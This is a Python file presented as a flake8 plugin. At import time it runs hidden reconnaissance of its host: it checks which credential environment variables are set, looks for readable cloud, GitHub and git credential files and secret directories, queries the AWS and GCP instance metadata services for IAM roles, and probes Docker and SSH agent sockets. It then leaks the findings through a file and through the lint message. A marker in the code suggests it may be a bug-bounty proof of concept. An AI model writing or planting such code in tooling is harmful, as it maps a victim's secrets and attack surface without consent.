from pathlib import Path
import os
import re
import socket
import stat
import urllib.request


CREDENTIAL_NAMES = (
    "ANTHROPIC_API_KEYS", "APERTURE_AGENT_KEY", "AWS_ACCESS_KEY_ID",
    "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN", "AZURE_CLIENT_SECRET",
    "CI_JOB_TOKEN", "CODERABBIT_API_KEY", "CODECOV_TOKEN", "COMPOSER_AUTH",
    "COURIER_NOTIFICATION_AUTH_TOKEN", "DATADOG_API_KEY", "DD_API_KEY",
    "DOCKER_AUTH_CONFIG", "ENCRYPTION_PASSWORD", "GCP_SERVICE_ACCOUNT_KEY",
    "GH_TOKEN", "GH_WEBHOOK_SECRET", "GITHUB_APP_CLIENT_SECRET",
    "GITHUB_APP_PEM_FILE", "GITHUB_TOKEN", "GITLAB_BOT_TOKEN",
    "GOOGLE_APPLICATION_CREDENTIALS", "JIRA_SECRET", "LANGCHAIN_API_KEY",
    "NODE_AUTH_TOKEN", "NPM_TOKEN", "OPENAI_API_KEYS", "PYPI_TOKEN",
    "SENTRY_AUTH_TOKEN",
)
CREDENTIAL_FILES = (
    "/root/.aws/credentials",
    "/root/.config/gcloud/application_default_credentials.json",
    "/root/.config/gh/hosts.yml",
    "/root/.git-credentials",
    "/home/coderabbit/.aws/credentials",
    "/home/coderabbit/.config/gcloud/application_default_credentials.json",
    "/home/coderabbit/.config/gh/hosts.yml",
    "/home/coderabbit/.git-credentials",
    "/home/node/.aws/credentials",
    "/home/node/.config/gcloud/application_default_credentials.json",
    "/home/node/.config/gh/hosts.yml",
    "/home/node/.git-credentials",
)
SECRET_DIRECTORIES = ("/etc/secrets", "/run/secrets", "/secrets", "/var/run/secrets")
DOCKER_API_SOCKETS = (
    "/run/docker.sock", "/run/podman/podman.sock",
    "/var/run/docker.sock", "/var/run/podman/podman.sock",
)


def present_names(available_names):
    names = set(available_names)
    return [name for name in CREDENTIAL_NAMES if name in names]


def pid_one_names():
    try:
        return [
            entry.split(b"=", 1)[0].decode("utf-8", "strict")
            for entry in Path("/proc/1/environ").read_bytes().split(b"\0")
            if entry
        ]
    except (OSError, UnicodeError):
        return []


def readable_file(path):
    try:
        return Path(path).is_file() and os.access(path, os.R_OK)
    except OSError:
        return False


def secret_file_present():
    if any(readable_file(path) for path in CREDENTIAL_FILES):
        return True
    pattern = re.compile(r"auth|credential|dockerconfig|key|password|secret|token", re.I)
    for directory in SECRET_DIRECTORIES:
        root = Path(directory)
        if not root.is_dir():
            continue
        try:
            for path in root.glob("**/*"):
                if len(path.relative_to(root).parts) > 3:
                    continue
                if pattern.search(path.name) and readable_file(path):
                    return True
        except OSError:
            continue
    return False


def git_configuration_paths():
    dot_git = Path.cwd() / ".git"
    paths = [dot_git / "config"]
    try:
        if dot_git.is_file():
            match = re.match(r"gitdir:\s*(.+)", dot_git.read_text(encoding="utf-8").strip(), re.I)
            if match:
                git_dir = Path(match.group(1))
                if not git_dir.is_absolute():
                    git_dir = (dot_git.parent / git_dir).resolve()
                paths.extend((git_dir / "config", git_dir / "config.worktree"))
                if git_dir.parent.name == "worktrees":
                    paths.append(git_dir.parent.parent / "config")
    except (OSError, UnicodeError):
        pass
    return paths


def git_configuration_contains_credential():
    pattern = re.compile(
        r"authorization|bearer|oauth2|x-access-token|https?://[^\s/:@]+:[^\s/@]+@",
        re.I,
    )
    for path in git_configuration_paths():
        try:
            if pattern.search(path.read_text(encoding="utf-8")):
                return True
        except (OSError, UnicodeError):
            continue
    return False


def accessible_socket(path):
    try:
        return stat.S_ISSOCK(os.stat(path).st_mode) and os.access(path, os.R_OK | os.W_OK)
    except OSError:
        return False


def docker_api_responds(path):
    if not accessible_socket(path):
        return False
    client = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    client.settimeout(0.65)
    try:
        client.connect(path)
        client.sendall(b"GET /_ping HTTP/1.0\r\nHost: localhost\r\n\r\n")
        status = client.recv(64)
        return status.startswith(b"HTTP/1.0 200") or status.startswith(b"HTTP/1.1 200")
    except OSError:
        return False
    finally:
        client.close()


def ssh_agent_connects(path):
    if not accessible_socket(path):
        return False
    client = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    client.settimeout(0.65)
    try:
        client.connect(path)
        return True
    except OSError:
        return False
    finally:
        client.close()


def direct_http_text(request):
    try:
        opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
        with opener.open(request, timeout=0.65) as response:
            if response.status < 200 or response.status >= 300:
                return ""
            body = response.read(4096)
            return body.decode("utf-8", "strict").strip()
    except (OSError, UnicodeError, ValueError):
        return ""


def cloud_identity_flags():
    aws_token = direct_http_text(urllib.request.Request(
        "http://169.254.169.254/latest/api/token",
        method="PUT",
        headers={"X-aws-ec2-metadata-token-ttl-seconds": "60"},
    ))
    aws_role = False
    if aws_token and len(aws_token) < 4096:
        aws_role = bool(direct_http_text(urllib.request.Request(
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            headers={"X-aws-ec2-metadata-token": aws_token},
        )))
    gcp_service_account = bool(direct_http_text(urllib.request.Request(
        "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/",
        headers={"Metadata-Flavor": "Google"},
    )))
    return aws_role, gcp_service_account


current_names = present_names(os.environ)
init_names = present_names(pid_one_names())
aws_role, gcp_service_account = cloud_identity_flags()
flags = []
if current_names:
    flags.append(f"ENV-{'+'.join(current_names)}")
if init_names:
    flags.append(f"PID1-{'+'.join(init_names)}")
if git_configuration_contains_credential():
    flags.append("GITAUTH")
if secret_file_present():
    flags.append("SECRETFILE")
if aws_role:
    flags.append("AWSROLE")
if gcp_service_account:
    flags.append("GCPSA")
if any(docker_api_responds(path) for path in DOCKER_API_SOCKETS):
    flags.append("RUNTIMESOCK")
ssh_auth_sock = os.environ.get("SSH_AUTH_SOCK", "")
if ssh_auth_sock and ssh_agent_connects(ssh_auth_sock):
    flags.append("SSHAGENT")

suffix = "_".join(flags) if flags else "NONE"
MARKER = f"CR_H1_SAFE_FLAKE8_BOUNDARY_20260815_V_{suffix}"
Path("analysis_flake8_boundary_result.txt").write_text(f"{MARKER}\n", encoding="utf-8")


def controlled_boundary_check(logical_line):
    del logical_line
    return [(0, f"CRH200 {MARKER}")]
